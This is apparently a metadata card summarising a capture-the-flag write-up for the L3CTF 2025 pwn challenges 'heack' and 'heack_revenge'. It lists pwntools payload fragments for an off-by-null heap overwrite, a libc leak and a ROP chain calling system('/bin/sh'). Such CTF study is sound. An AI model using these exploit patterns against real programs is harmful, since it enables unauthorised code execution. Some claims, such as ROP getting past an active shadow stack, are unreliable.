---
title: Pwn - L3CTF 2025 heack & heack_revenge
contest: L3CTF 2025
year: 2025
difficulty: high
vuln_type: rop
tags: [pwn, shstk, ibt, full-relro, canary, pie, dragon-game, off-by-null, ret2libc, xor-leak, house-of-?]
attack_chain:
  - heack: amd64-64-little + Full RELRO + Canary + PIE + SHSTK + IBT (Intel CET)
  - 主题 RPG：菜单 1/2/3/4 (Write/Destroy/View/Exit) + Attack Training
  - over() 输入 0x103 字节 + p8(0x17) 改 chunk size
  - io.send(p16(0x591A)) 写入 rbp/canary 等
  - io.recvuntil b'[Attack]: ' 泄 libc_base = 0x204643
  - payload = a*0x103 + p8(0x17) + p64(rdi+1) + p64(rdi) + p64(bin_sh) + p64(system)
  - heack_revenge: Full RELRO+Canary+PIE+SHSTK+IBT 全部加强
  - 严格 add(0x500) / free(1) / add(0x4e0) / add(0x100) 触发 unsorted bin
  - over(b'a'*0x23 + p8(0x37) + p8(0x6a)) off-by-null 改 chunk size
  - io.sendlineafter('>', '2') Attack Training 触发 v4 累加
  - io.recvuntil('[Attack]:') 泄 libc_base = 0x203b31
  - add(0, 0x10, "X"*0x10) 准备 0xc0 堆块
  - for i in range(10) io.sendlineafter(">", "2") 累加 combat_power
  - rop = p64(ret)*2 + p64(rdi) + p64(binsh) + p64(system)
  - add(0, 0xc0, "X"*0x20+rop) 写 ROP
  - io.sendlineafter("445") 退出触发
key_payload: over(b'a'*0x23+p8(0x37)+p8(0x6a)) + b'a'*0x20+rop (rdi+1+rdi+/bin/sh+system)
one_liner: L3CTF 2025 heack/heack_revenge：RPG 风格 PWN 菜单 + SHSTK/IBT 双重 CET 加固 + off-by-null 改 chunk size + 累加 combat_power 泄 libc + ROP 链。
lesson: 堆块 size 字段 off-by-null + 累加 training 计数器泄 libc 是关键；SHSTK/IBT 阻挡 ret2libc 需用 ROP+ret 多次堆栈对齐；add 0x20 字节边界非常严苛 (0x103 + p8(0x17) 是 0x104 字节)。
quality: high
---
